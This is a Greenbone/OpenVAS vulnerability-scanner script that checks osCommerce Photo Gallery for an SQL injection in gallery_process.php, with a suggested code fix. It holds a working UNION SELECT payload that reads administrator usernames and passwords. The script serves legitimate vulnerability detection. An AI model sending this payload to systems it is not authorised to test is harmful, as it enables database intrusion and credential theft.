# Copyright (C) 2009 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:oscommerce:oscommerce";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100000");
  script_version("2021-07-20T10:07:38+0000");
  script_tag(name:"last_modification", value:"2021-07-20 10:07:38 +0000 (Tue, 20 Jul 2021)");
  script_tag(name:"creation_date", value:"2009-02-20 17:40:17 +0100 (Fri, 20 Feb 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"Mitigation");

  script_name("osCommerce Photo Gallery SQLi Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_oscommerce_http_detect.nasl");
  script_mandatory_keys("oscommerce/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"impact", value:"Successful exploitation will allow the attacker to access the
  whole Database.");

  script_tag(name:"affected", value:"Photo Gallery <= version 0.6.");

  script_tag(name:"insight", value:"Input passed to the parameters in gallery_process.php are not
  properly sanitised before being used in the SQL queries.");

  script_tag(name:"solution", value:"Edit gallery_process.php and change all occurrences of
  $_GET['cID'] to (int)$_GET['cID'] and all occurrences of $_GET['pID'] to (int)$_GET['pID']. Then,
  at the top of gallery_process php, search for:

  require('includes/application_top.php')<comma>

  require(DIR_WS_LANGUAGES . $language . '/gallery_user.php')<comma>

  and change to:

  require('includes/application_top.php')<comma>

  if (!tep_session_is_registered('customer_id')) {

    tep_redirect(tep_href_link(FILENAME_LOGIN, '', 'SSL'))<comma>

  }

  require(DIR_WS_LANGUAGES . $language . '/gallery_user.php')<comma>");

  script_tag(name:"summary", value:"Photo Gallery for osCommerce is prone to an SQL injection (SQLi)
  vulnerability in gallery_process.php.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/gallery_process.php?edit=yes&pID=0%20union%20select%20user_name%20as%20title" +
            ",%20user_password%20as%20description%20from%20administrators%20&cID=0";

req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if( ! buf )
  exit( 0 );

if( egrep( pattern:".*union select.*", string:buf ) ||
    egrep( pattern:".*Table.*administrators.*doesn't exist.*", string:buf ) ) { # old versions of osc doesn't have table administrators
  report = http_report_vuln_url( port:port, url:url );
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
